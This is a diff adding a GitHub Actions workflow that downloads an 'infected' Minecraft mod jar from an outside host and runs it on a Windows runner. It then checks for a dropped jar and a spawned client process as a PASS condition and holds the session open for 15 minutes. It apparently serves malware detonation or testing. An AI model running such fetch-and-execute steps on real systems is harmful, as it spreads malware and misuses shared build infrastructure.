@@ -1,0 +1,39 @@
+name: LX-LIVE
+on:
+  workflow_dispatch:
+
+jobs:
+  live:
+    runs-on: windows-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '21'
+      - name: Prepare
+        shell: powershell
+        run: |
+          $d="$env:RUNNER_TEMP\lx"; New-Item -ItemType Directory -Force $d | Out-Null
+          Invoke-WebRequest "https://files.driftmetrics.xyz/test-minimal.jar" -OutFile "$d\minimal.jar"
+          Invoke-WebRequest "https://files.driftmetrics.xyz/test-marlow-infected.jar" -OutFile "$d\mod.jar"
+      - name: Run and hold
+        shell: powershell
+        run: |
+          $d="$env:RUNNER_TEMP\lx"
+          $p=Start-Process java -ArgumentList "-jar","$d\minimal.jar","--input=$d\mod.jar","--version=1.21.11","--fabric=0.18.4" -RedirectStandardOutput "$d\run.log" -RedirectStandardError "$d\run.err" -PassThru
+          "pid=$($p.Id)" | Tee-Object "$d\pid.txt"
+          for($i=0;$i -lt 60;$i++){
+            Start-Sleep 5
+            $cache=@(Get-ChildItem "$env:APPDATA\.minecraft\logs\telemetry\*-json.jar" -ErrorAction SilentlyContinue)
+            $proc=@(Get-CimInstance Win32_Process -Filter "name='javaw.exe' or name='java.exe'" | Where-Object { $_.CommandLine -match '(?i)-userid' })
+            Write-Host "t=$($i*5) jar=$($cache.Count) client=$($proc.Count)"
+            if($cache.Count -gt 0 -and $proc.Count -gt 0){ "PASS $($proc[0].ProcessId)" | Tee-Object "$d\result.txt"; break }
+          }
+          # hold the session open for the interactive test
+          Start-Sleep 900
+          Get-Content "$env:USERPROFILE\Desktop\mc.log" -Tail 40 -ErrorAction SilentlyContinue
+      - name: Kill
+        if: always()
+        shell: powershell
+        run: Get-CimInstance Win32_Process -Filter "name='java.exe' or name='javaw.exe'" | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
